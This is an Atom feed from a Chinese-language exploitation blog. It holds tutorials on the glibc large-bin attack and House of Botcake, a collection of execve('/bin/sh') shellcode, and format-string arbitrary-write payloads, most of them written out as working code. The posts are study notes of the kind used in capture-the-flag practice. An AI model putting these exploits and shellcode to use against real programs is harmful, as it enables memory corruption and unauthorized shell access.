<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>A4x7eq28&#39;Blog</title>
  
  
  <link href="http://www.4x7.fun/atom.xml" rel="self"/>
  
  <link href="http://www.4x7.fun/"/>
  <updated>2022-03-24T13:06:57.000Z</updated>
  <id>http://www.4x7.fun/</id>
  
  <author>
    <name>A4x7eq28</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HeapAttack: LargeBinAttack</title>
    <link href="http://www.4x7.fun/2022/03/23/HeapAttack-LargeBinAttack/"/>
    <id>http://www.4x7.fun/2022/03/23/HeapAttack-LargeBinAttack/</id>
    <published>2022-03-23T13:16:30.000Z</published>
    <updated>2022-03-24T13:06:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2><ul><li>漏洞要求：Write After Free</li><li>内存大小：可申请 large bin(即size&gt;=0x400)</li></ul><h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2><h3 id="21-攻击效果"><a class="markdownIt-Anchor" href="#21-攻击效果"></a> 2.1 攻击效果</h3><p>在unsorted-bin chunk被sort进large-bin时，触发***任意地址写***, 可以往***任意地址***中写入一个不可控的未知***大数*** (实际为***某堆地址***)。<br />实现以下目的：</p><ul><li>修改循环次数</li><li>修改global_max_fast 或arena-&gt;max_fast的值，从而把size&gt;0x80的chunk分配到fastbin中;或者在目标二进制使用mallopt(M_MXFAST,0)禁用fastbin后，重新启用</li><li>修改能够输出的变量，从而泄露堆地址</li></ul><h3 id="22-过程简述"><a class="markdownIt-Anchor" href="#22-过程简述"></a> 2.2 过程简述</h3><p>假设堆状态如下：</p><pre><code>unsorted-bin: A(0x400)large-bin: 0x400： B(0x410) </code></pre><p>若 <strong>B</strong> 存在Write After Free, 则修改 <em><strong>B-&gt;bk_nextsize</strong></em> 为 <em><strong>目标地址(target)</strong></em> 。<br />触发A加入到large-bin链表中，则会导致 <em><strong>A-&gt;bk_nextsize = B-&gt;bk_nextsize; A-&gt;bk_nextsize-&gt;fd_nextsize = B</strong></em> 即 <em><strong>target-&gt;fd_nextsize = A</strong></em> 。</p><p>即</p><pre><code>unsorted-bin: large-bin:0x400: B(0x410) -&gt; A(0x400) [A插入时触发攻击]</code></pre><h3 id="23-代码表示"><a class="markdownIt-Anchor" href="#23-代码表示"></a> 2.3 代码表示</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">static uint64_t target; //假设需要被更改值的目标地址</span><br><span class="line">int attack()&#123;</span><br><span class="line">    void* A, * B, * C;</span><br><span class="line"></span><br><span class="line">    A = malloc(0x400 - 8); //A小</span><br><span class="line">    malloc(0x18);</span><br><span class="line">    B = malloc(0x410 - 8); //B大</span><br><span class="line">    malloc(0x18);</span><br><span class="line"></span><br><span class="line">    free(B);</span><br><span class="line">    // unsortedbin: B</span><br><span class="line">    // largebin: empty</span><br><span class="line"></span><br><span class="line">    malloc(0x600);</span><br><span class="line">    // unsortedbin: empty</span><br><span class="line">    // largebin: 0x400: B(0x410)</span><br><span class="line"></span><br><span class="line">    free(A)；</span><br><span class="line">    // unsortedbin: A</span><br><span class="line">    // largebin: 0x400: B(0x410)</span><br><span class="line"></span><br><span class="line">    * ( uint64_t * )(B + 0x18) = ( uint64_t ) ( &amp;target ) - 0x20</span><br><span class="line">    //edit: B-&gt;bk_nextsize = target_over  &amp;&amp; let: target_over-&gt;fd_nextsize = target</span><br><span class="line"></span><br><span class="line">    malloc(0x600);</span><br><span class="line">    // unsortedbin: empty</span><br><span class="line">    // largebin: 0x400: B(0x410)-&gt;A(0x400) &#123;触发：A-&gt;bk_nextsize-&gt;fd_nextsize = A&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-原理分析"><a class="markdownIt-Anchor" href="#3-原理分析"></a> 3. 原理分析</h2><p>在glibc项目malloc.c文件_int_malloc函数中：<br />在chunk被从unsortedbin中sort下来之后的代码部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">. . . </span><br><span class="line">          /* place chunk in bin */</span><br><span class="line">          //// 若smallbin范围</span><br><span class="line">          if (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          else ////若在largebin范围</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">              //// largebin:: [bck]: fwd</span><br><span class="line">              /* maintain large bins in sorted order * /</span><br><span class="line">              if (fwd != bck) //// largebin不为空</span><br><span class="line">                &#123;</span><br><span class="line">                  /* Or with inuse bit to speed comparisons */</span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  /* if smaller than smallest, bypass loop below */</span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  if ((unsigned long) (size)</span><br><span class="line">      &lt; (unsigned long) chunksize_nomask (bck-&gt;bk)) ////确认victim为最小，因此插入到链表最后</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line">                      //// largebin:: [fwd]: bck</span><br><span class="line">                      //// 等同于2节例子中：[av]: B </span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd; ////fwd-&gt;fd 即为bck,也就是例子里的B</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; //// 因此victim-&gt;bk_nextsize = bck-&gt;bk_nextsize (即A-&gt;bk_nextsize = B-&gt;bk_nextsize)</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line"> ////即bck-&gt;bk_nextsize = bck-&gt;bk_nextsize-&gt;fd_nextsize = victim</span><br><span class="line"> ////即例子：B-&gt;bk_nextsize = B-&gt;bk_nextsize-&gt;fd_nextsize = A</span><br><span class="line"> ////==&gt; largebin attack的精髓即：B-&gt;bk_nextsize-&gt;fd_nextsize = A， </span><br><span class="line"> ////==&gt; 而它通过两步计算得到：victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize; 和 victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br></pre></td></tr></table></figure><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h3><p><a href="https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/largebin_attack.c">heap_exploit_2.31/largebin_attack.c</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-漏洞样式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-漏洞样式&quot;&gt;&lt;/a&gt; 1. 漏洞样式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;漏洞要求：Write After Free&lt;/li&gt;
&lt;li&gt;内存大小：可申请 large bin(即si</summary>
      
    
    
    
    <category term="HeapAttack" scheme="http://www.4x7.fun/categories/HeapAttack/"/>
    
    
    <category term="HeapAttack" scheme="http://www.4x7.fun/tags/HeapAttack/"/>
    
    <category term="LargeBinAttack" scheme="http://www.4x7.fun/tags/LargeBinAttack/"/>
    
    <category term="Arbitrary Write" scheme="http://www.4x7.fun/tags/Arbitrary-Write/"/>
    
    <category term="Write After Free" scheme="http://www.4x7.fun/tags/Write-After-Free/"/>
    
  </entry>
  
  <entry>
    <title>Shellcode Collection</title>
    <link href="http://www.4x7.fun/2022/03/21/shellcode/"/>
    <id>http://www.4x7.fun/2022/03/21/shellcode/</id>
    <published>2022-03-21T12:44:19.000Z</published>
    <updated>2022-03-24T12:54:12.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="32位"><a class="markdownIt-Anchor" href="#32位"></a> 32位</h2><p>有&quot;\x00&quot;最短 20 byte</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">shellcode= &#x27;&#x27;&#x27;            </span><br><span class="line">xor ecx,ecx               </span><br><span class="line">mul ecx                   </span><br><span class="line">mov al,0xb                </span><br><span class="line">push 0x68732f             </span><br><span class="line">push 0x6e69622f           </span><br><span class="line">mov ebx,esp               </span><br><span class="line">int 0x80                  </span><br><span class="line">&#x27;&#x27;&#x27;                       </span><br><span class="line">shellcode=asm(shellcode)</span><br></pre></td></tr></table></figure><p>无&quot;\x00&quot;最短 21 byte</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">mul ecx</span><br><span class="line">push eax</span><br><span class="line">mov al,0xb</span><br><span class="line">push 0x68732f2f   </span><br><span class="line">push 0x6e69622f   </span><br><span class="line">mov ebx,esp</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><p>标准shellcode 23 byte</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xB</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h2 id="64位"><a class="markdownIt-Anchor" href="#64位"></a> 64位</h2><p>最短有&quot;\x00&quot; 22 byte</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">mov rbx,0x68732f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>最短无&quot;\x00&quot; 23 byte</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>标准shellcode 31 byte</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">xor    rdi,rdi</span><br><span class="line">xor    rsi,rsi</span><br><span class="line">xor    rdx,rdx</span><br><span class="line">xor    rax,rax</span><br><span class="line">push   rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push   rbx</span><br><span class="line">mov    rdi,rsp</span><br><span class="line">mov    al,0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><h3 id="转载自"><a class="markdownIt-Anchor" href="#转载自"></a> 转载自:</h3><p><a href="https://b0ldfrev.gitbook.io/note/pwn/linux_shellcode">Linux_ShellCode</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;32位&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#32位&quot;&gt;&lt;/a&gt; 32位&lt;/h2&gt;
&lt;p&gt;有&amp;quot;\x00&amp;quot;最短 20 byte&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="shellcode" scheme="http://www.4x7.fun/categories/shellcode/"/>
    
    
    <category term="shellcode" scheme="http://www.4x7.fun/tags/shellcode/"/>
    
  </entry>
  
  <entry>
    <title>HeapAttack: House_of_Botcake</title>
    <link href="http://www.4x7.fun/2022/03/18/HeapAttack-House-of-Botcake/"/>
    <id>http://www.4x7.fun/2022/03/18/HeapAttack-House-of-Botcake/</id>
    <published>2022-03-18T12:16:10.000Z</published>
    <updated>2022-03-24T13:06:03.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2><ul><li>glibc版本：≥ 2.3.1</li><li>Tcache：开启</li><li>漏洞要求：double free</li></ul><h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2><h3 id="21-攻击效果"><a class="markdownIt-Anchor" href="#21-攻击效果"></a> 2.1 攻击效果</h3><p>绕过Tcache的 tcache-dup 检查，将 <em><strong>可控chunk</strong></em> 插入 <em><strong>Tcache-list</strong></em>,修改 <em><strong>可控chunk</strong></em> 的 <em><strong>fd</strong></em> 字段，从而 <strong>最终实现</strong> <em><strong>任意地址写</strong></em>’。</p><h3 id="22-攻击过程"><a class="markdownIt-Anchor" href="#22-攻击过程"></a> 2.2 攻击过程</h3><p>伪代码表示如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">size = 0x108</span><br><span class="line"></span><br><span class="line">mem_lst = [ malloc(size) for x in range(7) ] #创建7个chunk</span><br><span class="line"></span><br><span class="line">a = malloc(size) </span><br><span class="line">b = malloc(size)  #a,b chunk是主角</span><br><span class="line"></span><br><span class="line">malloc(0x18) #和top_chunk隔离，防止forward-consolidation</span><br><span class="line"></span><br><span class="line">[free(x) for x in mem_lst] #把7个chunk free到tcache中,tcache被填满</span><br><span class="line"></span><br><span class="line">free(a) #因tcache已满，a、b进unsorted-bin</span><br><span class="line">free(b) #a、b邻接,因此发生consolidate合并成一个chunk在unsorted-bin中</span><br><span class="line"></span><br><span class="line">malloc(size) #一次分配后tcache有一个空位</span><br><span class="line">free(b) #对b使用double-free攻击。由于b不在tcache中，因此通过tcache检查被加入到tcache中。</span><br><span class="line"></span><br><span class="line">c = malloc(size + 0x30) #unsorted-bin发生remaindering，chunk-b的前0x30被memory-c overlap</span><br><span class="line"></span><br><span class="line">payload = size * b&quot;\0&quot; + p64(size) + p64(target_address) </span><br><span class="line">#不同size时的payload写法不同；但目的是target_address覆盖到 b-&gt;fd</span><br><span class="line"></span><br><span class="line">write(c, payload)  ##这里将target_address链接到tcache list中，下次对tcache size的内存请求即可分配到目标地址的内存chunk</span><br><span class="line"></span><br><span class="line">target_memory = malloc(size)</span><br><span class="line">write(target_memory, arbitrary_value)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考：</h3><p><a href="https://github.com/StarCross-Tech/heap_exploit_2.31/blob/master/house_of_botcake.c">heap_exploit_2.31/house_of_botcake.c</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-漏洞样式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-漏洞样式&quot;&gt;&lt;/a&gt; 1. 漏洞样式&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;glibc版本：≥ 2.3.1&lt;/li&gt;
&lt;li&gt;Tcache：开启&lt;/li&gt;
&lt;li&gt;漏洞要求：doub</summary>
      
    
    
    
    <category term="HeapAttack" scheme="http://www.4x7.fun/categories/HeapAttack/"/>
    
    <category term="tcache" scheme="http://www.4x7.fun/categories/HeapAttack/tcache/"/>
    
    
    <category term="HeapAttack" scheme="http://www.4x7.fun/tags/HeapAttack/"/>
    
    <category term="House_of_Botcake" scheme="http://www.4x7.fun/tags/House-of-Botcake/"/>
    
    <category term="tcache" scheme="http://www.4x7.fun/tags/tcache/"/>
    
  </entry>
  
  <entry>
    <title>Format-String Attack</title>
    <link href="http://www.4x7.fun/2022/03/18/fmtstr_attack/"/>
    <id>http://www.4x7.fun/2022/03/18/fmtstr_attack/</id>
    <published>2022-03-18T03:42:27.000Z</published>
    <updated>2022-03-24T12:54:16.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2><p>通常情况下漏洞程序样式：</p><div align=center>Table 1. Vulnerable Code Demo</div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">char buffer[1024];</span><br><span class="line">gets(buffer, 1024);</span><br><span class="line">printf(buffer);</span><br></pre></td></tr></table></figure><p>字符串 <strong>buffer</strong> 可控且作为 <strong>printf</strong> 的第一个参数。当其中包含 <strong>格式化字符(例如%s, %d, %p等)</strong> 时，栈上的内容就会被当做printf的第2个、第3个参数等被输出。</p><h2 id="2-利用方法"><a class="markdownIt-Anchor" href="#2-利用方法"></a> 2. 利用方法</h2><h3 id="21-确定偏移"><a class="markdownIt-Anchor" href="#21-确定偏移"></a> 2.1 确定偏移</h3><p>输入字符串（即Table 1中<strong>buffer</strong>）在栈上的偏移，即<strong>buffer</strong>被<strong>printf</strong>当做参数时，作为第几个参数。参数序号从0开始： printf(arg0, arg1, arg2, …, argn); 第10参数即表示arg10</p><ul><li>步骤1. <strong>break printf</strong> ；即在 <strong>printf</strong> 下断点</li><li>步骤2. 输入 <strong>%p%p%p%p</strong> 等特殊字符</li><li>步骤3. 在  <strong>printf</strong> 函数断点，使用 <strong>stack</strong> 命令查看栈。找到 <strong>%p%p%p%p</strong> 特殊字符串在栈上的位置。如Figure 1所示。<br /><img src="https://s2.loli.net/2022/03/18/vqXDrI3Z5m4CHRE.png" alt="" /></li></ul><div align=center>Figure 1. printf stack illustration</div>需注意图中①断点在**printf**入口，已跳转到**printf** 但尚未执行**printf**中指令（尤其是栈指令，否则栈布局会改变）；注意图中② **0b** 即字符串 **%p%p%p%p** 距离栈顶( **esp** )的偏移为 **11**；由于在 **esp + 0** 的位置存放函数返回地址。因此 **%p%p%p%p** 字符串实际上位于 ***栈上*** 第 **10** 个参数。- 步骤4. 根据不同架构确定 **buffer** 在 **printf** 函数参数的序号。参考[**函数调用约定**](https://www.laruence.com/2008/04/01/116.html)。    - a). x86架构           x86架构的函数参数全部通过栈传递， 因此 **buffer** 是 **printf** 的第**10**个参数。           - b). x64架构         x64传参顺序为rdi, rsi, rdx, rcx, r8, r9; 之后才使用栈传参。因此若 **Figure 1** 在x64架构中，**buffer**对应的是**printf**函数的第（0xb + 6 - 1)= 16 个参数(参数序号从0开始，0，1，2，..., 16)。    <h3 id="22-实现任意地址写"><a class="markdownIt-Anchor" href="#22-实现任意地址写"></a> 2.2 实现任意地址写</h3><p>往 <strong>任意目标地址(记为target_address)</strong> 中写入 <strong>任意值(记为target_value)</strong> 。</p><ul><li>1). 任意值的控制：通过格式化字符串 <strong>%Mc</strong> 其中 <strong>M=target_value</strong>来操控</li><li>2). 任意地址的控制：将目标地址(<strong>target_address</strong>)写入<strong>buffer</strong>字符串中；并通过格式化字符串 <strong>%N$n</strong>来指定将 <em><strong>当前printf已经输字符个数</strong></em> 写入到第 <strong>N</strong> 个参数指定的地址中。其中 <strong>N</strong>即为’使用<strong>2.1</strong>中方法确定的‘’在<strong>buffer</strong>字符串中的‘’<strong>target_address</strong>在栈上的位置对应的<strong>printf</strong>的参数序号‘。(该处使用’'分句停顿帮助阅读)</li></ul><p>例如：</p><h4 id="221-当target_value-较小时直接写入"><a class="markdownIt-Anchor" href="#221-当target_value-较小时直接写入"></a> 2.2.1 当<strong>target_value</strong> 较小时，直接写入</h4><p>假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）</p><div align=center>Table 2. Payload Demo 1</div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 写4到target_address</span><br><span class="line">payload1 = p32(target_address) + b&#x27;%10$n\0&#x27;</span><br></pre></td></tr></table></figure><p>其中：<br />payload1实现写4(p32为4byte)到target_address</p><div align=center>Table 3. Payload Demo 2</div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">payload2 = b&#x27;%13$n&#x27; + b&#x27;%100c&#x27; </span><br><span class="line">payload2 = payload2.ljust(12, b&#x27;a&#x27;)</span><br><span class="line">payload2 += p32(target_address)</span><br></pre></td></tr></table></figure><p>payload2实现写100到target_address, 此处由于target_adress没有写在字符串的开头，因此需要重新计算在栈上的偏移：字符串开头位于arg10处，字符串中target_address之前有12个字符即占3个参数位，因此target_address对应的参数位为13</p><h4 id="222-当target_value太大时分字节写入"><a class="markdownIt-Anchor" href="#222-当target_value太大时分字节写入"></a> 2.2.2 当target_value太大时，分字节写入</h4><p>假如buffer字符串位于printf第10个参数的位置(即arg10、即printf栈0xb(10+1)参数位）；且需要向<strong>target_address</strong> 中写入的<strong>target_value</strong>为***0xbaedbeef***。</p><pre><code>实际上就是令：*(int8*)target_address = 0xef = 239*(int8*)(target_address + 1) = 0xbe = 190*(int8*)(target_address + 2) = 0xed = 237*(int8*)(target_address + 3) = 0xba = 186</code></pre><p>这种情况下使用 <strong>%Nhhn** 向目标地址写入**int8**宽度值 和 使用 **%Nhn</strong> 向目标地址写入<strong>int16</strong>宽度值，将会非常有用。</p><p>那么可以使用如下payload实现：</p><div align=center>Table 4. Payload Demo 3</div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(target_address)          //arg10</span><br><span class="line">payload += p32(target_address + 1)     //arg11</span><br><span class="line">payload += p32(target_address + 2)     //arg12</span><br><span class="line">payload += p32(target_address + 3)     //arg13</span><br><span class="line">//已有16byte输出；写入时从小到大写；即186-&gt;190-&gt;237-&gt;239</span><br><span class="line">// 186 - 16 = 170</span><br><span class="line">payload += b&quot;%170c%13$hhn&quot;</span><br><span class="line">// 190 - 186 = 4</span><br><span class="line">payload += b&quot;%4c%11$hhn&quot;</span><br><span class="line">// 237 - 190 = 47</span><br><span class="line">payload += b&quot;%47c%12$hhn&quot;</span><br><span class="line">// 239 - 237 = 2</span><br><span class="line">payload += b&quot;%2c%10$hhn&quot;</span><br></pre></td></tr></table></figure><h4 id="223-使用pwnlib的fmtstr_payload函数自动构造payload"><a class="markdownIt-Anchor" href="#223-使用pwnlib的fmtstr_payload函数自动构造payload"></a> 2.2.3 使用<strong>pwnlib</strong>的<strong>fmtstr_payload</strong>函数自动构造payload</h4><p>示例如下：</p><div align=center>Table 5. Payload Demo 4: fmtstr_payload</div><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from pwnlib.util import misc</span><br><span class="line">//payload = fmtstr_payload(10, &#123;0x804c044: 0x1&#125;)</span><br><span class="line">payload = fmtstr_payload(10, &#123;target_address: target_value&#125;)</span><br><span class="line">io.send(payload)</span><br></pre></td></tr></table></figure><h2 id="2-注意事项"><a class="markdownIt-Anchor" href="#2-注意事项"></a> 2. 注意事项</h2><h2 id="3-原理说明"><a class="markdownIt-Anchor" href="#3-原理说明"></a> 3. 原理说明</h2><p>参考：<br /><a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">fmtstr_attack on ctf-wiki</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1-漏洞样式&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-漏洞样式&quot;&gt;&lt;/a&gt; 1. 漏洞样式&lt;/h2&gt;
&lt;p&gt;通常情况下漏洞程序样式：&lt;/p&gt;
&lt;div align=center&gt;Table 1. Vulnerable Code</summary>
      
    
    
    
    <category term="Format String" scheme="http://www.4x7.fun/categories/Format-String/"/>
    
    
    <category term="Format String" scheme="http://www.4x7.fun/tags/Format-String/"/>
    
  </entry>
  
  <entry>
    <title>404</title>
    <link href="http://www.4x7.fun/404.html"/>
    <id>http://www.4x7.fun/404.html</id>
    <published>2022-02-23T11:48:56.000Z</published>
    <updated>2022-03-24T12:50:00.000Z</updated>
    
    <content type="html"><![CDATA[<hr /><div align=center align=mid style="font-size:4em">Page Not Found</div><hr />]]></content>
    
    
      
      
    <summary type="html">&lt;hr /&gt;
&lt;div align=center align=mid style=&quot;font-size:4em&quot;&gt;Page Not Found&lt;/div&gt;
&lt;hr /&gt;
</summary>
      
    
    
    
    
    <category term="404" scheme="http://www.4x7.fun/tags/404/"/>
    
  </entry>
  
</feed>
